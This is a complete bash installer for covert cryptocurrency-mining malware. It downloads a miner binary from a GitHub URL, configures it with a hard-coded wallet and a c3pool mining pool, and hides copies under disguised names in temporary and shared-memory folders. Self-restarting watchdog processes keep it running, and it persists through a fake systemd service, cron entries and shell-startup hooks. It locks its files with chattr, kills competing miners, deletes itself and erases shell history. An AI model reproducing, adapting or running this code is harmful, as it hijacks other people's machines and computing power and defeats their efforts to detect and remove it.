#!/usr/bin/env bash
cd "$HOME" 2>/dev/null||cd /tmp 2>/dev/null||true
W="46mFnamercs1JhprY9oXKmRvXZb7PoG5BUrdRNaNwvnbYUdKVaZ9Qecbh7RLUpi4uVeMoURjgN33UJ4L7Q73Mz2M2gsJ8p2"
POOL="${POOL:-auto.c3pool.org:443}"
RAW="https://raw.githubusercontent.com/gmcluci/lucifer/main"
NAMES="jon joni jono joko jajang ucok budi agus slamet rizki dewi putri sari ayu indah"
r(){ local o;o=$(tr -dc 'a-z0-9'</dev/urandom 2>/dev/null|head -c "$1");[ ${#o} -lt "$1" ]&&o=$(printf '%s%s' "$o" "$(date +%s%N 2>/dev/null|sha256sum 2>/dev/null|tr -dc 'a-z0-9')"|head -c "$1");[ -z "$o" ]&&o="${RANDOM}${RANDOM}x$1";printf '%s' "$o"|head -c "$1"; }
h(){ printf '%s' "$1"|sha256sum 2>/dev/null|cut -d' ' -f1; }
trymk(){ b="$1";d="$(dirname "$b")";[ -d "$d" ]||return 1;[ -w "$d" ]||return 1;command -v chattr >/dev/null 2>&1&&[ "$(id -u)" = 0 ]&&chattr -R -i "$b" 2>/dev/null;mkdir -p "$b" 2>/dev/null;[ -d "$b" ]||return 1;[ -w "$b" ]||return 1;touch "$b/.wtest" 2>/dev/null||return 1;rm -f "$b/.wtest" 2>/dev/null;echo "$b";return 0; }
pick1(){ for b in /var/tmp/.font-unix /dev/shm/.u /var/tmp/.d1 "$HOME/.d1";do trymk "$b"&&return;done; }
pick2(){ for b in /var/tmp/.systemd-private /dev/shm/.i /var/tmp/.d2 "$HOME/.d2";do trymk "$b"&&return;done; }
pick3(){ for b in /tmp/.ICE-unix/.d /tmp/.X11-unix/.d /dev/shm/.d /var/tmp/.d3 "$HOME/.d3";do trymk "$b"&&return;done; }
ST="$(pick3)/.s"
[ -f "$HOME/.cache/.m""iner_state" ]&&{ LG="$HOME/.cache/.m""iner_state";read OW OD OS OT<"$LG" 2>/dev/null;[ -n "$OS" ]&&{ systemctl --user stop "$OS" 2>/dev/null;systemctl --user disable "$OS" 2>/dev/null;systemctl stop "$OS" 2>/dev/null;systemctl disable "$OS" 2>/dev/null;rm -f "$HOME/.config/systemd/user/${OS}.service" "/etc/systemd/system/${OS}.service" 2>/dev/null;systemctl --user daemon-reload 2>/dev/null;systemctl daemon-reload 2>/dev/null; };[ -n "$OT" ]&&{ crontab -l 2>/dev/null|grep -v "$OT"|crontab - 2>/dev/null;rm -f /etc/cron.d/.sys_"$OT" /etc/profile.d/.sys_"$OT".sh 2>/dev/null;for rc in "$HOME/.bashrc" "$HOME/.profile" "$HOME/.bash_profile" "$HOME/.zshrc" "$HOME/.zprofile";do [ -f "$rc" ]&&grep -q "$OT" "$rc" 2>/dev/null&&{ grep -v "$OT" "$rc">"${rc}.t"&&mv "${rc}.t" "$rc" 2>/dev/null; };done; };[ -n "$OD" ]&&{ chattr -R -i "$OD" 2>/dev/null;rm -rf "$OD" 2>/dev/null; };[ -n "$OW" ]&&{ chattr -R -i "$OW" 2>/dev/null;rm -rf "$OW" 2>/dev/null; };rm -f "$LG" 2>/dev/null; }
[ -f "$HOME/.cache/.sys_state" ]&&{ read O1 O2 O3 OS OT OK<"$HOME/.cache/.sys_state" 2>/dev/null;[ -n "$OS" ]&&{ systemctl --user stop "$OS" 2>/dev/null;systemctl --user disable "$OS" 2>/dev/null;systemctl stop "$OS" 2>/dev/null;systemctl disable "$OS" 2>/dev/null;rm -f "$HOME/.config/systemd/user/${OS}.service" "/etc/systemd/system/${OS}.service" 2>/dev/null;systemctl --user daemon-reload 2>/dev/null;systemctl daemon-reload 2>/dev/null; };[ -n "$OT" ]&&{ crontab -l 2>/dev/null|grep -v "$OT"|crontab - 2>/dev/null;rm -f /etc/cron.d/.s_"$OT" /etc/profile.d/.s_"$OT".sh 2>/dev/null;for rc in "$HOME/.bashrc" "$HOME/.profile" "$HOME/.bash_profile" "$HOME/.zshrc" "$HOME/.zprofile";do [ -f "$rc" ]&&grep -q "$OT" "$rc" 2>/dev/null&&{ grep -v "$OT" "$rc">"${rc}.t"&&mv "${rc}.t" "$rc" 2>/dev/null; };done; };for d in "$O1" "$O2" "$O3";do [ -n "$d" ]&&{ chattr -R -i "$d" 2>/dev/null;rm -rf "$d" 2>/dev/null; };done;rm -f "$HOME/.cache/.sys_state" 2>/dev/null; }
ps aux 2>/dev/null|awk '$11~/_(w[0-9]|x[a-z0-9]{4})$/||$11~/_d[a-z0-9]{8}$/||$11~/^wd_[a-z0-9]{12}$/{print $2}'|xargs -r kill -9 2>/dev/null
rm -rf "$HOME"/.cache/.cache_* "$HOME"/.local/share/.cache_* "$HOME"/.config/.cache_* 2>/dev/null
rm -f /etc/cron.d/.sys_mk_* /etc/profile.d/.sys_mk_*.sh "$HOME"/.config/systemd/user/svc-*.service /etc/systemd/system/svc-*.service 2>/dev/null
sleep 0.3
ps aux 2>/dev/null|awk '$11~/_(w[0-9]|x[a-z0-9]{4})$/||$11~/_d[a-z0-9]{8}$/||$11~/^wd_[a-z0-9]{12}$/{print $2}'|xargs -r kill -9 2>/dev/null
A="$(uname -m)";case "$A" in x86_64|amd64)SRC="systemx86";;aarch64|arm64)SRC="system64";;*)echo "unsupported: $A">&2;exit 1;;esac
if [ -n "${1:-}" ];then P="$1";elif [ -f /etc/machine-id ];then P="$(sha256sum /etc/machine-id|cut -c1-12)";else P="$(hostname 2>/dev/null|sha256sum|cut -c1-12)";fi
SEED="${MS:-${2:-}}"
[ -z "$SEED" ]&&{ echo "seed kosong. set env MS atau arg2">&2;exit 1; }
HN="$(hostname 2>/dev/null||cat /proc/sys/kernel/hostname 2>/dev/null)"
TK="$(h "${SEED}|${HN}")"
TKH="$(h "$TK")"
W1="$(pick1)";W2="$(pick2)";W3="$(dirname "$ST")"
{ [ -z "$W1" ]||[ -z "$W2" ]; }&&{ echo "no writable sysdir">&2;exit 1; }
BN="jon_x$(r 4)";DN1="d1_$(r 6)_w1";DN2="d2_$(r 6)_w2";DN3="d3_$(r 6)_w3";SV="sv-$(r 8)";TG="t_$(r 8)"
DSCR="";case "$0" in /*|./*) [ -f "$0" ]&&DSCR="$(cd "$(dirname "$0")" 2>/dev/null && pwd)/$(basename "$0")";; esac
ROLES="$W1:$DN1 $W2:$DN2 $W3:$DN3"
dl(){ rm -f "$W1/$BN" 2>/dev/null;if command -v curl >/dev/null 2>&1;then curl -sSL --connect-timeout 20 --max-time 90 -o "$W1/$BN" "$RAW/$SRC" 2>/dev/null;[ -s "$W1/$BN" ]&&[ "$(wc -c <"$W1/$BN" 2>/dev/null)" -gt 1000000 ]&&return 0;fi;if command -v wget >/dev/null 2>&1;then wget -q --timeout=60 -O "$W1/$BN" "$RAW/$SRC" 2>/dev/null;[ -s "$W1/$BN" ]&&[ "$(wc -c <"$W1/$BN" 2>/dev/null)" -gt 1000000 ]&&return 0;fi;return 1; }
ok=0;for i in 1 2 3 4 5;do dl&&{ ok=1;break; };sleep 2;done
[ "$ok" = 0 ]&&{ echo "download failed: $RAW/$SRC (curl=$(command -v curl|wc -l) wget=$(command -v wget|wc -l) w1w=$([ -w "$W1" ]&&echo y||echo n))">&2;exit 1; }
chmod +x "$W1/$BN"
printf '{"autosave":true,"donate-level":0,"donate-over-proxy":0,"cpu":{"enabled":true,"huge-pages":true,"max-threads-hint":75},"opencl":false,"cuda":false,"pools":[{"url":"%s","user":"%s","pass":"%s","keepalive":true,"tls":true}]}\n' "$POOL" "$W" "$P">"$W1/.c"
chmod 600 "$W1/.c"
for d in "$W1" "$W2" "$W3";do
cat > "$d/.e" <<E
W="$W"
POOL="$POOL"
RAW="$RAW"
SRC="$SRC"
PW="$P"
TKH="$TKH"
NAMES="$NAMES"
ROLES="$ROLES"
ST="$ST"
SV="$SV"
TG="$TG"
DS="$DSCR"
E
chmod 600 "$d/.e"
done
cat > "$W1/$DN1" <<'E'
#!/usr/bin/env bash
MYDIR="$(cd "$(dirname "$0")" 2>/dev/null && pwd)"
i=0;while [ ! -f "$MYDIR/.e" ]&&[ $i -lt 8 ];do sleep 2;i=$((i+1));done
. "$MYDIR/.e" 2>/dev/null
MB="$(basename "$0")"
ROLE="${MB##*_}"
r(){ local o;o=$(tr -dc 'a-z0-9'</dev/urandom 2>/dev/null|head -c "$1");[ ${#o} -lt "$1" ]&&o=$(printf '%s%s' "$o" "$(date +%s%N 2>/dev/null|sha256sum 2>/dev/null|tr -dc 'a-z0-9')"|head -c "$1");[ -z "$o" ]&&o="${RANDOM}${RANDOM}x$1";printf '%s' "$o"|head -c "$1"; }
h(){ printf '%s' "$1"|sha256sum 2>/dev/null|cut -d' ' -f1; }
hc(){ command -v chattr >/dev/null 2>&1&&[ "$(id -u)" = 0 ]; }
sh(){ hc&&chattr -R +i "$1" 2>/dev/null; }
us(){ hc&&chattr -R -i "$1" 2>/dev/null; }
nx(){ b="${1%%_*}";i=0;for nb in $NAMES;do i=$((i+1));[ "$nb" = "$b" ]&&break;done;t=$(echo $NAMES|cut -d' ' -f$(((i%15)+1)));echo "${t}_x$(r 4)"; }
fnd(){ find "$MYDIR" -maxdepth 1 -type f ! -name '.*' ! -name 'd[123]_*' 2>/dev/null|while read f;do b="$(basename "$f")";case "$b" in *_x?|*_x??|*_x???|*_x????|*_x?????|*_x??????) echo "$f";break;; esac;done; }
rep(){ for e in $ROLES;do d="${e%%:*}";n="${e##*:}";if [ "$d" = "$MYDIR" ]&&[ "$n" = "$MB" ];then continue;fi;if [ ! -f "$d/$n" ]&&[ -f "$MYDIR/$MB" ];then us "$d";mkdir -p "$d" 2>/dev/null;cp "$MYDIR/$MB" "$d/$n" 2>/dev/null;[ -f "$MYDIR/.e" ]&&[ ! -f "$d/.e" ]&&cp "$MYDIR/.e" "$d/.e" 2>/dev/null;chmod +x "$d/$n" 2>/dev/null;fi;if [ -f "$d/$n" ];then pgrep -f "$d/$n">/dev/null 2>&1||nohup "$d/$n" >/dev/null 2>&1 & fi;done; }
CFG='{"autosave":true,"donate-level":0,"donate-over-proxy":0,"cpu":{"enabled":true,"huge-pages":true,"max-threads-hint":75},"opencl":false,"cuda":false,"pools":[{"url":"POOLURL","user":"WALLETHERE","pass":"PASSHERE","keepalive":true,"tls":true}]}'
bld(){ mkdir -p "$MYDIR" 2>/dev/null;[ -f "$MYDIR/.c" ]&&return 0;echo "$CFG"|sed "s/POOLURL/$POOL/;s/WALLETHERE/$W/;s/PASSHERE/$PW/">"$MYDIR/.c" 2>/dev/null;chmod 600 "$MYDIR/.c" 2>/dev/null; }
cfgchk(){ grep -q "$POOL" "$MYDIR/.c" 2>/dev/null&&return 0;echo "$CFG"|sed "s/POOLURL/$POOL/;s/WALLETHERE/$W/;s/PASSHERE/$PW/">"$MYDIR/.c" 2>/dev/null;chmod 600 "$MYDIR/.c" 2>/dev/null; }
die(){ kc="";e="";d="";rc="";[ -z "$TKH" ]&&{ rm -f "$MYDIR/.die" 2>/dev/null;return; };kc=$(cat "$MYDIR/.die" 2>/dev/null);[ "$(h "$kc")" != "$TKH" ]&&{ rm -f "$MYDIR/.die" 2>/dev/null;return; };for e in $ROLES;do d="${e%%:*}";us "$d";printf '%s' "$kc">"$d/.die" 2>/dev/null;done;sleep 2;if [ -n "$SV" ];then systemctl --user stop "$SV" 2>/dev/null;systemctl --user disable "$SV" 2>/dev/null;systemctl stop "$SV" 2>/dev/null;systemctl disable "$SV" 2>/dev/null;rm -f "$HOME/.config/systemd/user/${SV}.service" "/etc/systemd/system/${SV}.service" 2>/dev/null;systemctl --user daemon-reload 2>/dev/null;systemctl daemon-reload 2>/dev/null;fi;if [ -n "$TG" ];then crontab -l 2>/dev/null|grep -v "$TG"|crontab - 2>/dev/null;rm -f "/etc/cron.d/.s_${TG}" "/etc/profile.d/.s_${TG}.sh" 2>/dev/null;for rc in "$HOME/.bashrc" "$HOME/.profile" "$HOME/.bash_profile" "$HOME/.zshrc" "$HOME/.zprofile";do [ -f "$rc" ]&&grep -q "$TG" "$rc" 2>/dev/null&&{ grep -v "$TG" "$rc">"${rc}.t"&&mv "${rc}.t" "$rc" 2>/dev/null; };done;fi;for e in $ROLES;do d="${e%%:*}";us "$d";rm -rf "$d" 2>/dev/null;done;rm -f "$ST" 2>/dev/null;exit 0; }
cnt=0
while :;do
[ -f "$MYDIR/.die" ]&&die
rep
if [ "$ROLE" = "w1" ]&&[ -n "$DS" ]&&[ -f "$DS" ];then rm -f "$DS" 2>/dev/null;history -c 2>/dev/null;history -w 2>/dev/null;DS="";fi
if [ "$ROLE" = "w1" ];then
sleep $((RANDOM%3))
if ! pgrep -f '_x[a-z0-9]'>/dev/null 2>&1;then
bld
cfgchk
bin=$(fnd)
if [ -z "$bin" ];then
for i in 1 2 3 4 5;do rm -f "$MYDIR/.t" 2>/dev/null;curl -sSL --connect-timeout 20 --max-time 90 -o "$MYDIR/.t" "$RAW/$SRC" 2>/dev/null;[ -s "$MYDIR/.t" ]&&[ "$(wc -c <"$MYDIR/.t" 2>/dev/null)" -gt 1000000 ]&&break;wget -q --timeout=60 -O "$MYDIR/.t" "$RAW/$SRC" 2>/dev/null;[ -s "$MYDIR/.t" ]&&[ "$(wc -c <"$MYDIR/.t" 2>/dev/null)" -gt 1000000 ]&&break;sleep 2;done
[ -f "$MYDIR/.t" ]&&{ nb="jon_x$(r 4)";mv "$MYDIR/.t" "$MYDIR/$nb" 2>/dev/null;chmod +x "$MYDIR/$nb" 2>/dev/null; }
bin=$(fnd)
fi
if [ -n "$bin" ]&&[ -f "$MYDIR/.c" ];then
us "$MYDIR"
RB="/dev/shm/.k_$(r 6)"
cp "$bin" "$RB" 2>/dev/null&&chmod +x "$RB" 2>/dev/null||RB="$bin"
cd "$MYDIR"
FN="$(basename "$bin")"
CFGP="$MYDIR/.c"
bash -c 'exec -a "'"$FN"'" "$0" -c "'"$CFGP"'"' "$RB" >>"$MYDIR/.log" 2>&1
ec=$?
rm -f "$RB" 2>/dev/null
if [ $ec -ne 0 ]&&[ ! -s "$MYDIR/.log" ];then echo "exit=$ec $(date +%s)">>"$MYDIR/.log";fi
nb=$(nx "$(basename "$bin")")
[ -f "$bin" ]&&mv "$bin" "$MYDIR/$nb" 2>/dev/null
sh "$MYDIR"
sleep 1
else
sleep 4
fi
else
sleep 5
fi
else
if pgrep -f '_w1'>/dev/null 2>&1;then cnt=0;else cnt=$((cnt+1));fi
if [ $cnt -ge 3 ];then
us "$MYDIR"
mv "$0" "$MYDIR/${MB%_*}_w1" 2>/dev/null
exec "$MYDIR/${MB%_*}_w1"
fi
sleep 5
fi
done
E
chmod +x "$W1/$DN1"
cp "$W1/$DN1" "$W2/$DN2";chmod +x "$W2/$DN2"
cp "$W1/$DN1" "$W3/$DN3";chmod +x "$W3/$DN3"
printf '%s\n%s\n%s\n%s\n%s\n%s\n' "$W1" "$W2" "$W3" "$SV" "$TG" "$TKH">"$ST"
chmod 600 "$ST"
SO=0;CO=0;RO=0
if command -v systemctl >/dev/null 2>&1;then
mkdir -p "$HOME/.config/systemd/user"
cat > "$HOME/.config/systemd/user/${SV}.service" <<E
[Unit]
Description=System Data Service
After=default.target
[Service]
Type=simple
ExecStart=$W1/$DN1
Restart=always
RestartSec=1
StandardOutput=null
StandardError=null
[Install]
WantedBy=default.target
E
systemctl --user daemon-reload 2>/dev/null
systemctl --user enable "$SV" 2>/dev/null
systemctl --user start "$SV" 2>/dev/null&&SO=1
if [ "$SO" != 1 ]&&[ "$(id -u)" = 0 ];then
cat > "/etc/systemd/system/${SV}.service" <<E
[Unit]
Description=System Data Service
After=network.target
[Service]
Type=simple
ExecStart=$W1/$DN1
Restart=always
RestartSec=1
StandardOutput=null
StandardError=null
[Install]
WantedBy=multi-user.target
E
systemctl daemon-reload 2>/dev/null
systemctl enable "$SV" 2>/dev/null
systemctl start "$SV" 2>/dev/null&&SO=1
fi
fi
CM="pgrep -f '$DN1' >/dev/null 2>&1||nohup $W1/$DN1 >/dev/null 2>&1 &"
if command -v crontab >/dev/null 2>&1;then
TC="$(mktemp 2>/dev/null||echo /tmp/.ct_$(r 6))"
crontab -l 2>/dev/null|grep -v "$TG">"$TC" 2>/dev/null||true
printf '%s\n* * * * * %s\n@reboot (sleep $((RANDOM %% 20)) && %s)\n' "$TG" "$CM" "$CM">>"$TC"
crontab "$TC" 2>/dev/null&&CO=1
rm -f "$TC"
fi
[ "$CO" != 1 ]&&[ -d /etc/cron.d ]&&[ -w /etc/cron.d ]&&{ printf '%s\n* * * * * %s\n@reboot (sleep $((RANDOM %% 20)) && %s)\n' "$TG" "$CM" "$CM">/etc/cron.d/.s_"$TG";CO=1; }
HK="pgrep -f '$DN1' >/dev/null 2>&1||(nohup $W1/$DN1 >/dev/null 2>&1 &) 2>/dev/null # $TG"
for rc in "$HOME/.bashrc" "$HOME/.profile" "$HOME/.bash_profile" "$HOME/.zshrc" "$HOME/.zprofile";do
[ -f "$rc" ]||continue
grep -q "$TG" "$rc" 2>/dev/null&&{ grep -v "$TG" "$rc">"${rc}.t"&&mv "${rc}.t" "$rc" 2>/dev/null; }
echo "$HK">>"$rc"
RO=1
done
[ "$RO" != 1 ]&&echo "$HK">>"$HOME/.bashrc"
[ -d /etc/profile.d ]&&[ -w /etc/profile.d ]&&echo "pgrep -f '$DN1' >/dev/null 2>&1||(nohup $W1/$DN1 >/dev/null 2>&1 &) 2>/dev/null">/etc/profile.d/.s_"$TG".sh
command -v chattr >/dev/null 2>&1&&[ "$(id -u)" = 0 ]&&chattr -R +i "$W1" "$W2" "$W3" 2>/dev/null
launch(){ pgrep -f "$1" >/dev/null 2>&1&&return 0;if command -v setsid >/dev/null 2>&1;then setsid bash -c "exec \"$1\"" >/dev/null 2>&1 < /dev/null & else nohup bash -c "exec \"$1\"" >/dev/null 2>&1 < /dev/null & fi;disown 2>/dev/null;return 0; }
launch "$W1/$DN1"
launch "$W2/$DN2"
launch "$W3/$DN3"
sleep 2
for pair in "$W1/$DN1" "$W2/$DN2" "$W3/$DN3";do pgrep -f "$pair" >/dev/null 2>&1||launch "$pair";done
printf 'OK %s pass=%s\n' "$HN" "$P"
history -c 2>/dev/null;history -w 2>/dev/null
cat /dev/null > "$HOME/.bash_history" 2>/dev/null
cat /dev/null > "$HOME/.zsh_history" 2>/dev/null
unset HISTFILE 2>/dev/null
